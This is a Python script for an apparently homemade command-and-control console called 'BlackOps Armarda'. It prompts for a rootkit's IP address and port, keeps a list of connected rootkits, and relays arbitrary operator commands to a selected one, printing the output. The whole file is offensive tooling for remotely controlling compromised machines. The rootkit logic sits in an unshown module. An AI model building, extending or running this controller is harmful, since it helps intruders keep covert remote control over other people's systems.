#!/bin/python3.11
"""
creates the CLI for the user to interact with
"""
from rich.console import Console
import rich
import os
import sys

import tools

class CLI:
    def __init__(self):
        self.prompt = "BlackOps::home::#>"
        self.console = Console()
        self.core_commands = [
            ("help", "display info on all available commands, or information on a command", self.command_help, ["help [command]"]),
            ("clear", "clears the screen", self.command_clear, []),
            ("banner", "display the system banner", self.command_banner, []),
            ("conns", "show all connected tools", self.command_conns, []),
            ("connect", "connect to a tool", self.command_connect, []),
            ("interact", "interact with a tool", self.command_interact, []),
            ("exit", "quit the cli", self.command_exit, [])
            ]
        self.tool_commands = list()
        self.connections = list()

    def __call__(self):
        self.command_clear()
        self.command_banner()
        print("    welcome to the blackops armarda cli\n\n")
        self.command_help()
        self.command_line()

    def command_help(self, tool=None, *args, **kwargs):
        if args==() and kwargs=={}:
            print("\ncore commands")
            print("============\n")
            print("    command            description")
            print("    -------            -----------")
            for command in self.core_commands:
                print(f"    {command[0]:<25}{command[1]}")
            print("\n")
            if tool!=None:
                print(f"{tool.help_info[0]}: {tool.help_info[1]}")
                print(f"{tool.help_info[0]} commands")
                print("============\n")
                print("    command            description")
                print("    -------            -----------")
                for command in tool.commands:
                    print(f"    {command[0]:<25}{command[1]}")
            print("\n\n")

    def command_clear(self):
        os.system("clear")

    def command_banner(self):
        self.console.print("[#910101]██████  ██       █████   ██████ ██   ██  ██████  ██████  ███████      █████  ██████  ███    ███  █████  ██████  ██████   █████")
        self.console.print("[#910101]██   ██ ██      ██   ██ ██      ██  ██  ██    ██ ██   ██ ██          ██   ██ ██   ██ ████  ████ ██   ██ ██   ██ ██   ██ ██   ██       [white]written by [bold #910101]Lord of the IoT")
        self.console.print("[#910101]██████  ██      ███████ ██      █████   ██    ██ ██████  ███████     ███████ ██████  ██ ████ ██ ███████ ██████  ██   ██ ███████")
        self.console.print("[#910101]██   ██ ██      ██   ██ ██      ██  ██  ██    ██ ██           ██     ██   ██ ██   ██ ██  ██  ██ ██   ██ ██   ██ ██   ██ ██   ██")
        self.console.print("[#910101]██████  ███████ ██   ██  ██████ ██   ██  ██████  ██      ███████     ██   ██ ██   ██ ██      ██ ██   ██ ██   ██ ██████  ██   ██")
        print("\n\n")

    def command_exit(self):
        print("goodbye, cya soon")
        sys.exit(0)

    def command_line(self):
        while True:
            try:
                self.prompt = "BlackOps::home::#>"
                user_input = self.console.input(f"[red]{self.prompt}").strip().split()
                if user_input == []:
                    continue
                for command in self.core_commands:
                    if command[0] == user_input[0]:
                        command[2]()
            except KeyboardInterrupt:
                pass

    def command_connect(self):
        self.prompt = "    BlackOps::connect::#>"
        print("  enter IPv4 adress of the rootkit")
        address = self.console.input(f"[red]{self.prompt}")
        print("  Enter port of the rootkit")
        port = int(self.console.input(f"[red]{self.prompt}"))
        rootkit = tools.Rootkit(address, port)
        rootkit._init_connection_()
        self.connections.append(rootkit)

    def command_conns(self):
        print("\nconnected tools")
        print("===============\n")
        print("#   ID              server          port")
        print("-   --              ------          ----")
        i=1
        for conn in self.connections:
            print(f"{i:<3}{conn.id:<16}{conn.addr:<16}{conn.port:<5}")
            i+=1
        print()

    def command_interact(self):
        print("  enter ID or # of the tool to interact with")
        self.prompt = "    BlackOps::interact::#>"
        user_input = self.console.input(f"[red]{self.prompt}")
        tool = None
        if user_input.isdigit():
            tool = self.connections[int(user_input)-1]
        else:
            for tool in self.connections:
                if user_input==tool: break
        while True:
            try:
                user_input = self.console.input(f"[red]{tool.prompt}").strip()
                if user_input == "help":
                    self.command_help(tool)
                elif user_input == "exit":
                    tool.__exit__()
                    return
                else:
                    result = tool.send(user_input)
                    if type(result)==int:
                        continue
                    print(result.decode(errors="replace"))
            except KeyboardInterrupt:
                print("use command exit to disconnect")

if __name__=="__main__":
    cli = CLI()
    cli()
